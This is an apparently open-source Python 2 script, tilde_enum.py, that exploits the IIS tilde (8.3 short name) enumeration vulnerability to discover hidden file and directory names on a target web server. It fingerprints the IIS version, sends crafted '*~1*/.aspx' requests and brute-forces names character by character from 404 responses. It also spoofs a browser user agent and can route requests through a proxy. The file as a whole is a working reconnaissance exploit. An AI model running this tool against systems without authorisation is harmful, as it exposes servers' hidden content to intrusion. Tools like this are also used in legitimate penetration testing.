#!/usr/bin/env python

"""
-------------------------------------------------------------------------------
Name:       tilde_enum.py
Purpose:    Find dir/file names from the tilde enumeration vuln
Author:     esaBear
Fork from:  Micah Hoffman (@WebBreacher)
-------------------------------------------------------------------------------
"""

import os
import sys
import argparse
import random
import string
import itertools
import urllib2
from urlparse import urlparse
from time import sleep

#=================================================
# Constants and Variables
#=================================================

# In the 'headers' below, change the data that you want sent to the remote server
# This is an IE10 user agent
headers = {'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)'}

# Targets is the list of files from the scanner output
targets = []

# Findings is the list of URLs that may be good on the web site
findings_new = []
# TODO - Are all of these really necessary?
findings_file =  {}      # Files discovered
findings_other = []      # HTTP Response Codes other than 200
findings_final = []      # Where the guessed files are output
findings_dir =   []      # Directories discovered
findings_dir_other =        []
findings_dir_final =        []
findings_dir_other_final =  []

# Location of the extension brute force word list
exts = 'exts'

# Character set to use for brute forcing
chars = 'abcdefghijklmnopqrstuvwxyz1234567890-_(),'

# Response codes - user and error
response_code = {}


#=================================================
# Functions & Classes
#=================================================


def printResult(msg, color='', level=1):
    # print and output to file.
    # level = 0 : Mute on screen
    # level = 1 : Important messages
    # level = 2 : More details
    if args.verbose_level >= level:
        if color:
            print color + msg + bcolors.ENDC
        else:
            print msg
    if args.out_file:
        if args.verbose_level >= level or level == 1:
            f = open(args.out_file, 'a+')
            f.write(msg + '\n')
            f.close()

def checkOs():
    # Check operating system for colorization
    if os.name == "nt":
        operating_system = "windows"
    else:
        operating_system = "posix"
    return operating_system


def getWebServerResponse(url):
    # This function takes in a URL and outputs the HTTP response code and content length (or error)
    try:
        sleep(args.wait)
        req = urllib2.Request(url, None, headers)
        response = urllib2.urlopen(req)
        return response
    except urllib2.URLError as e:
        return e
    except Exception as e:
        return 0


def initialCheckUrl(url):
    # This function checks to see if the web server is running and what kind of response codes
    # come back from bad requests (this will be important later)

    # Need to split url into protocol://host|IP and then the path
    u = urlparse(url)

    # Make a string that we can use to ensure we know what a "not found" response looks like
    not_there_string = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for x in range(13))
    printResult('[-]  Testing with dummy file request %s://%s%s%s.htm' % (u.scheme, u.netloc, u.path, not_there_string), bcolors.GREEN)
    not_there_url = u.scheme + '://' + u.netloc + u.path + not_there_string + '.htm'

    # Make the dummy request to the remote server
    not_there_response = getWebServerResponse(not_there_url)

    # Create a content length
    not_there_response_content_length = len(not_there_response.read())

    if not_there_response.getcode():
        printResult('[-]    URLNotThere -> HTTP Code: %s, Response Length: %s' % (not_there_response.getcode(), not_there_response_content_length))
        response_code['not_there_code'], response_code['not_there_length'] = not_there_response.getcode(), not_there_response_content_length
    else:
        printResult('[+]    URLNotThere -> HTTP Code: %s, Error Code: %s' % (not_there_response.code, not_there_response.reason))
        response_code['not_there_code'], response_code['not_there_reason'] = not_there_response.code

    # Check if we didn't get a 404. This would indicate custom error messages or some redirection and will cause issues later.
    if response_code['not_there_code'] != 404:
        printResult('[!]  FALSE POSITIVE ALERT: We may have a problem determining real responses since we did not get a 404 back.', bcolors.RED)

    # Now that we have the "definitely not there" page, check for one that should be there
    printResult('[-]  Testing with user-submitted %s' % url, bcolors.GREEN)
    url_response = getWebServerResponse(url)
    if url_response.getcode():
        response_code['user_length'] = len(url_response.read())
        response_code['user_code'] = url_response.getcode()
        printResult('[-]    URLUser -> HTTP Code: %s, Response Length: %s' % (response_code['user_code'], response_code['user_length']))
    else:
        printResult('[+]    URLUser -> HTTP Code: %s, Error Code: %s' % (url_response.code, url_response.reason))
        response_code['user_code'], response_code['user_reason'] = url_response.code, url_response.reason

    # Check if we got an HTTP response code of 200.
    if response_code['user_code'] != 200:
        printResult('[!]  WARNING: We did not receive an HTTP response code 200 back with given url.', bcolors.RED)
        #sys.exit()
    else:
        return response_code

##### Not Using in current version #####
def searchFileForString(targetstring, filename):
    # Open the wordlist file (or try to)
    try:
        wordlist = open(filename,'r').readlines()
    except (IOError) :
        printResult('[!]  [Error] Can\'t read the wordlist file you entered.', bcolors.RED)
        sys.exit()

    matches = []
    for line in wordlist:
        if line.startswith(targetstring.lower()):
            matches.append(line.rstrip())
    return matches


def checkVulnerableString(url):
    # Set the default string to be IIS6.x
    check_string = '*~1*/.aspx'

    # Check if the server is IIS and vuln to tilde directory enumeration
    if args.f:
        printResult('[!]  You have used the -f switch to force us to scan. Well played. Using the IIS/6 "*~1*/.aspx" string.', bcolors.YELLOW)
        return check_string

    server_header = getWebServerResponse(url)
    if server_header.headers.has_key('server'):
        if 'IIS' in server_header.headers['server'] or 'icrosoft' in server_header.headers['server']:
            printResult('[+]  The server is reporting that it is IIS (%s).' % server_header.headers['server'], bcolors.GREEN)
            if   '5.' in server_header.headers['server']:
                check_string = '*~1*'
            elif '6.' in server_header.headers['server']:
                pass # just use the default string already set
        else:
            printResult('[!]  Error. Server is not reporting that it is IIS.', bcolors.RED)
            printResult('[!]     (Request error: %s)' % server_header.getcode(), bcolors.RED)
            printResult('[!]     If you know it is, use the -f flag to force testing and re-run the script. (%s)' % server_header, bcolors.RED)
            sys.exit()
    else:
        printResult('[!]  Error. Server is not reporting that it is IIS.', bcolors.RED)
        printResult('[!]     (Request error: %s)' % server_header.getcode(), bcolors.RED)
        printResult('[!]     If you know it is, use the -f flag to force testing and re-run the script. (%s)' % server_header, bcolors.RED)
        sys.exit()

    # Check to see if the server is vulnerable to the tilde vulnerability
    resp1 = getWebServerResponse(args.url + '~1*/.aspx')
    resp2 = getWebServerResponse(args.url + '*~1*/.aspx')
    if resp1.code != resp2.code:
        printResult('[+]  The server is vulnerable to the tilde enumeration vulnerability (IIS/5|6.x)..', bcolors.YELLOW)
    else:
        printResult('[!]  Error. Server is probably NOT vulnerable or given path is wrong.', bcolors.RED)
        printResult('[!]     If you know it is, use the -f flag to force testing and re-run the script.', bcolors.RED)
        sys.exit()

    return check_string

def addNewFindings(findings=[]):
    findings_new.extend(findings)
    
def findExtensions(url, filename):
    possible_exts = {}
    found_files = []
    notFound = True
    for char1 in chars:
        resp1a = getWebServerResponse(url+filename+'*'+char1+'*/.aspx')
        if resp1a.code == 404:  # Got the first valid char
            notFound = False
            possible_exts[char1] = 1
            for char2 in chars:
                resp2a = getWebServerResponse(url+filename+'*'+char1+char2+'*/.aspx')
                if resp2a.code == 404:  # Got the second valid char
                    del possible_exts[char1]
                    possible_exts[char1+char2] = 1
                    for char3 in chars:
                        resp3a = getWebServerResponse(url+filename+'*'+char1+char2+char3+'/.aspx')
                        if resp3a.code == 404:  # Got the third valid char
                            del possible_exts[char1+char2]
                            possible_exts[char1+char2+char3] = 1

    # Check for directory anyway
    if confirmDirectory(url, filename):
        addNewFindings(filename+'/')

    if notFound:
        printResult('[!]  Something is wrong:  %s%s/ should be a directory, but the response is strange.'%(url,filename), bcolors.RED)
    else:
        possible_exts = sorted(possible_exts.keys(), key=len, reverse=True)
        while possible_exts:
            item = possible_exts.pop()
            if not any(map(lambda s:s.endswith(item), possible_exts)):
                printResult('[+]  Found file:  ' +filename+'.'+item, bcolors.YELLOW)
                found_files.append(filename+'.'+item)
        addNewFindings(found_files)
    return
    

def confirmDirectory(url, filename):
    resp = getWebServerResponse(url + filename + '/.aspx')
    if resp.code == 404 and 'x-aspnet-version' not in resp.headers:
        return True
    else:
        return False

def counterEnum(url, check_string, found_name):
    # Enumerate ~2 ~3 and so on
    foundNameWithCounter = [found_name+'~1']
    lastCounter = 1
    for i in xrange(2, 10):
        test_name = '%s~%d' % (found_name, i)
        test_url = url + test_name + '*/.aspx'
        resp = getWebServerResponse(test_url)
        if resp.code == 404:
            foundNameWithCounter.append(test_name)
            lastCounter = i
        else: # if ~2 is not existed, no need for ~3
            break

    if lastCounter > 1:
        printResult('[+]  counterEnum: %s%s counter end with ~%d.'%(url,found_name,lastCounter), bcolors.GREEN, 2)
    for filename in foundNameWithCounter:
        findExtensions(url, filename)

def charEnum(url, check_string, current_found, current_depth):
    # Enumerate character recursively
    notFound = True
    if current_depth > 6:
        counterEnum(url, check_string, current_found)
        return
    else:
        # check if there are matched names shorter than 6
        test_url = url + current_found + '~1*/.aspx'
        resp = getWebServerResponse(test_url)
        if resp.code == 404:
            counterEnum(url, check_string, current_found)
            notFound = False
    
    for char in chars:
        resp = getWebServerResponse(url + current_found + char + check_string)
        if resp.code == 404:
            charEnum(url, check_string, current_found+char, current_depth+1)
            notFound = False
    if notFound:
        printResult('[!]  Something is wrong:  %s%s[?] cannot continue. Maybe not in searching charcters.'%(url,current_found), bcolors.RED)
    
def checkEightDotThreeEnum(url, check_string, dirname='/'):
    # Here is where we find the files and dirs using the 404 and 400 errors
    # If the dir var is not passed then we assume this is the root level of the server

    url = url + dirname

    charEnum(url, check_string, '', 1)
    printResult('[-]  Finished doing the 8.3 enumeration for %s.' % dirname, bcolors.GREEN)
    return

##### Not Using in current version #####
def performLookups(findings, url_good):
    # Find matches to the filename in our word list
    for dirname in findings['files'].keys():
        ext_matches= []
        for filename in findings['files'][dirname]:
            if not filename: continue
            # Break apart the file into filename and extension
            filename, ext_temp = os.path.splitext(filename)
            ext = ext_temp.lstrip('.')

            # Go search the user's word list file for matches for the file
            if len(filename) < 6:
                printResult('[-]  File name (%s) too short to look up in word list. We will use it to bruteforce.' % filename, bcolors.GREEN)
                filename_matches.append(filename)
            else:
                printResult('[-]  Searching for %s in word list' % filename, bcolors.PURPLE, 2)
                filename_matches = searchFileForString(filename, args.wordlist)

            # If nothing came back from the search, just try use the original string
            if not filename_matches:
                filename_matches.append(filename)
            printResult('[+]  File name matches for %s are: %s' % (filename, filename_matches), bcolors.PURPLE, 2)

            # Go search the extension word list file for matches for the extension
            if len(ext) < 3:
                printResult('[-]  Extension (%s) too short to look up in word list. We will use it to bruteforce.' % ext, bcolors.GREEN)
                ext_matches.append(ext.lower())
            else:
                printResult('[-]  Searching for %s in extension word list' % ext, bcolors.PURPLE, 2)
                ext_matches = searchFileForString(ext, exts)
            printResult('[+]  Extension matches for %s are: %s' % (ext, ext_matches), bcolors.PURPLE, 2)

            # Now do the real hard work of cycling through each filename_matches and adding the ext_matches,
            # do the look up and examine the response codes to see if we found a file.
            for line in filename_matches:
                for e in ext_matches:
                    test_response_code, test_response_length = '', ''

                    if url_good[-1] != '/':
                        url_to_try = url_good + '/' + line + '.' + e.rstrip()
                    else:
                        url_to_try = url_good + line + '.' + e.rstrip()
                    url_response = getWebServerResponse(url_to_try)

                    # Pull out just the HTTP response code number
                    if hasattr(url_response, 'code'):
                        test_response_code = url_response.code
                        test_response_length = url_response.headers['Content-Length']
                    elif hasattr(url_response, 'getcode'):
                        test_response_code = url_response.getcode()
                        test_response_length = len(url_response.reason())
                    else:
                        test_response_code = 0

                    printResult('[+]  URL: %s  -> RESPONSE: %s' % (url_to_try, test_response_code), bcolors.PURPLE, 2)

                    # Here is where we figure out if we found something or just found something odd
                    if test_response_code == response_code['user_code']:
                        printResult('[*]  Found file: (Size %s) %s' % (test_response_length, url_to_try))
                        findings_final.append(url_to_try + '  - Size ' + test_response_length)
                    elif test_response_code != 404 and test_response_code != 400:
                        printResult('[?]  URL: (Size %s) %s with Response: %s ' % (test_response_length, url_to_try, url_response))
                        findings_other.append('HTTP Resp ' + str(test_response_code) + ' - ' + url_to_try + '  - Size ' + test_response_length)

    # Match directory names
    printResult('[-]  Trying to find directory matches now.', bcolors.GREEN)
    if args.dirwordlist:
        printResult('[-]  You used the "-d" option.\n      Using %s for directory name look-ups.' % args.dirwordlist, bcolors.GREEN)
    else:
        printResult('[-]  Using the general wordlist to discover directory names.', bcolors.GREEN)
        printResult('       If this does not work well, consider using the -d argument and providing a directory name wordlist.', bcolors.GREEN)

    for dirname in findings['dirs']:
        # Go search the user's word list file for matches for the directory name
        printResult('[+]  Searching for %s in word list' % dirname, bcolors.PURPLE, 2)
        if args.dirwordlist:
            dir_matches = searchFileForString(dirname, args.dirwordlist)
        else:
            dir_matches = searchFileForString(dirname, args.wordlist)

        # If nothing came back from the search, just try use the original string
        if not dir_matches:
            dir_matches.append(dirname)
        printResult('[+]  Directory name matches for %s are: %s' % (dirname, dir_matches), bcolors.PURPLE, 2)

        # Now try to guess the live dir name by cycling through each directory name
        for matches in dir_matches:
            test_response_code, test_response_length = '', ''

            # Here we check the response to a plain dir request AND one with default files
            url_to_try = url_good + '/' + matches + '/'
            url_response = getWebServerResponse(url_to_try)

            # Pull out just the HTTP response code number
            if hasattr(url_response, 'code'):
                test_response_code = url_response.code
                test_response_length = url_response.headers['Content-Length']
            elif hasattr(url_response, 'getcode'):
                test_response_code = url_response.getcode()
                test_response_length = len(url_response.reason())
            else:
                test_response_code = 0

            printResult('[+]  URL: %s  -> RESPONSE: %s' % (url_to_try, test_response_code), bcolors.PURPLE, 2)

            # Here is where we figure out if we found  or just found something odd
            if test_response_code == response_code['user_code']:
                printResult('[*]  Found directory: (Size %s) %s' % (test_response_length, url_to_try), bcolors.YELLOW)
                findings_dir_final.append(url_to_try + '  - Size ' + test_response_length)
            elif test_response_code == 403:
                printResult('[?]  URL: (Size %s) %s with Response: %s ' % (test_response_length, url_to_try, url_response), bcolors.YELLOW)
                findings_dir_other.append('HTTP Resp ' + str(test_response_code) + ' - ' + url_to_try + '  - Size ' + test_response_length)

                # Sometimes directories cannot just be requested and we have to know the default file name in it.
                default_index_files = ['default.asp', 'default.aspx', 'default.htm', 'default.html', 'home.htm', 'home.html',
                                       'index.asp', 'index.aspx', 'index.cgi', 'index.htm', 'index.html', 'index.php',
                                       'index.php3', 'index.php4', 'index.php5', 'index.shtml', 'isstart.htm', 'placeholder.html']

                # Cycle through all the default_index_files and see if any of those get us a match
                # TODO - This does not feel right duplicating the code from above. Should be a method instead
                for index_file in default_index_files:
                    test_response_code, test_response_length = '', ''

                    # Here we check the response to a plain dir request AND one with default files
                    url_to_try = url_good + '/' + matches + '/' + index_file
                    url_response = getWebServerResponse(url_to_try)

                    # Pull out just the HTTP response code number
                    if hasattr(url_response, 'code'):
                        test_response_code = url_response.code
                        test_response_length = url_response.headers['Content-Length']
                    elif hasattr(url_response, 'getcode'):
                        test_response_code = url_response.getcode()
                        test_response_length = len(url_response.reason())
                    else:
                        test_response_code = 0

                    printResult('[+]  URL: %s  -> RESPONSE: %s' % (url_to_try, test_response_code), bcolors.PURPLE, 2)

                    # Here is where we figure out if we found something or just found something odd
                    if test_response_code == response_code['user_code']:
                        printResult('[*]  Found directory: (Size %s) %s' % (test_response_length, url_good + '/' + matches))
                        findings_dir_final.append(url_good + '/' + matches + '  - Size ' + test_response_length)

            elif test_response_code != 404 and test_response_code != 403:
                printResult('[?]  URL: (Size %s) %s with Response: %s ' % (test_response_length, url_to_try, url_response), bcolors.YELLOW)
                findings_dir_other.append('HTTP Resp ' + str(test_response_code) + ' - ' + url_to_try + '  - Size ' + test_response_length)


def main():
    # Check the User-supplied URL
    if args.url:
        if args.url[-1:] != '/':
            args.url += '/'
        response_code = initialCheckUrl(args.url)
    else:
        printResult('[!]  You need to enter a valid URL for us to test.', bcolors.RED)
        sys.exit()

    printResult('[+]  HTTP Response Codes: %s' % response_code, bcolors.PURPLE, 2)

    if args.wait != 0 :
        printResult('[-]  User-supplied delay detected. Waiting %s seconds between HTTP requests.' % args.wait)

    # Check to see if the remote server is IIS and vulnerable to the Tilde issue
    check_string = checkVulnerableString(args.url)

    # Break apart the url
    url = urlparse(args.url)
    url_good = url.scheme + '://' + url.netloc + url.path

    # Do the initial search for files in the root of the web server
    checkEightDotThreeEnum(url.scheme + '://' + url.netloc, check_string, url.path)
    
    printResult('\n---------- FINAL OUTPUT ------------------------------')
    for finding in sorted(findings_new):
        printResult(args.url + finding)

    printResult('---------- OUTPUT COMPLETE ---------------------------\n\n\n')
    return ########### Stop here

    printResult('Files: %s' % findings['files'], bcolors.PURPLE, 2)
    printResult('Dirs: %s' % findings['dirs'], bcolors.PURPLE, 2)

    # Start the URL requests to the server
    printResult('[-]  Now starting the word guessing using word list calls', bcolors.GREEN)

    # So the URL is live and gives 200s back (otherwise script would have exit'd)
    performLookups(findings, url_good)

    if findings_dir_final:
        printResult('[-]  Now starting recursive 8.3 enumeration into the directories we found.', bcolors.GREEN)

    # Now that we have all the findings, repeat the above step with any findings that are directories and add those findings to the list
    for dirname in findings_dir_final:
        # Strip off the dir
        url_good = dirname.split()[0]

        printResult('[-]  Diving into the %s dir.' % url_good, bcolors.GREEN)

        # Do the 8.3 discovery for this dir
        checkEightDotThreeEnum(url_good, check_string)

        # So the URL is live and gives 200s back (otherwise script would have exit'd)
        performLookups(findings, url_good)

    # Output findings
    if findings_final:
        printResult('\n---------- FINAL OUTPUT ------------------------------')
        printResult('[*]  We found files for you to look at:', bcolors.YELLOW)
        for out in sorted(findings_final):
            printResult('[*]      %s' % out, bcolors.CYAN)
    else:
        printResult('[ ]  No file full names were discovered. Sorry dude.', bcolors.RED)

    if findings_dir_final:
        printResult('\n[*]  We found directories for you to look at:', bcolors.YELLOW)
        for out in sorted(findings_dir_final):
            printResult('[*]      %s' % out, bcolors.CYAN)

    printResult('\n[*]  Here are all the 8.3 names we found.', bcolors.YELLOW)
    printResult('[*]  If any of these are 5-6 chars and look like they should work,', bcolors.YELLOW)
    printResult('        try the file name with the first or second instead of all of them.', bcolors.YELLOW)

    for dirname in findings['files'].keys():
        for filename in sorted(findings['files'][dirname]):
            if not filename: continue
            # Break apart the file into filename and extension
            filename, ext = os.path.splitext(filename)
            printResult('[*]      %s://%s%s%s~1%s' % (url.scheme, url.netloc, dirname, filename, ext))

    printResult('\n[*]  Here are all the directory names we found. You may wish to try to guess them yourself too.', bcolors.YELLOW)
    for dirname in sorted(findings['dirs']):
        printResult('[?]      %s/%s~1/' % (url.scheme + '://' + url.netloc, dirname))

    if findings_other:
        printResult('\n[*]  We found URLs you check out. They were not HTTP response code 200s.', bcolors.YELLOW)
        for out in sorted(findings_other):
            printResult('[?]      %s' % out, bcolors.DARKCYAN)

    if findings_dir_other:

        # TODO - Implement additional checking for each of the dirs ! Code 200s
        # Set up the default file names and extensions for main web pages in directories
        #default_index = [
        #                    ['default', 'home', 'index', 'isstart', ''],
        #                    ['.asp', '.aspx', '.htm', '.html', '.php', '.php3', '.php4', '.php5', '.cgi', '.shtml',
        #                     '.jsp', '.do', '.cfm', '.nsf', '']
        #                ]

        # Use itertools to combine all the names and extensions
        #default_files = list(itertools.product(*default_index))

        #+ ''.join(default_name)

        printResult('\n[*]  We found directory URLs you should check out. They were not HTTP response code 200s.', bcolors.YELLOW)
        for out in sorted(findings_dir_other):
            printResult('[?]      %s' % out, bcolors.DARKCYAN)


#=================================================
# START
#=================================================

# Command Line Arguments
parser = argparse.ArgumentParser(description='Exploits and expands the file names found from the tilde enumeration vuln')
parser.add_argument('-d', dest='dirwordlist', help='an optional wordlist for directory name content')
parser.add_argument('-f', action='store_true', default=False, help='force testing of the server even if the headers do not report it as an IIS system')
parser.add_argument('-o', dest='out_file',default='', help='Filename to store output')
parser.add_argument('-p', dest='proxy',default='', help='Use a proxy host:port')
parser.add_argument('-u', dest='url', help='URL to scan')
parser.add_argument('-v', dest='verbose_level', type=int, default=1, help='verbose level of output (0~2)')
parser.add_argument('-w', dest='wait', default=0, type=float, help='time in seconds to wait between requests')
args = parser.parse_args()

# COLORIZATION OF OUTPUT
# The entire bcolors class was taken verbatim from the Social Engineer's Toolkit (ty @SET)
if checkOs() == "posix":
    class bcolors:
        PURPLE = '\033[95m'        # Verbose
        CYAN = '\033[96m'
        DARKCYAN = '\033[36m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'        # Normal
        YELLOW = '\033[93m'        # Findings
        RED = '\033[91m'        # Errors
        ENDC = '\033[0m'        # End colorization

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.DARKCYAN = ''

# If we are running on Windows or something like that then define colors as nothing
else:
    class bcolors:
        PURPLE = ''
        CYAN = ''
        DARKCYAN = ''
        BLUE = ''
        GREEN = ''
        YELLOW = ''
        RED = ''
        ENDC = ''

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.DARKCYAN = ''

if args.proxy:
    printResult('[-]  Using proxy for requests: ' + args.proxy, bcolors.PURPLE)
    proxy = urllib2.ProxyHandler({'http': args.proxy, 'https': args.proxy})
    opener = urllib2.build_opener(proxy)
    urllib2.install_opener(opener)

if args.verbose_level > 1:
    printResult('[-]  Verbose Level=%d ....brace yourself for additional information.'%args.verbose_level, bcolors.PURPLE, 2)

if __name__ == "__main__": main()
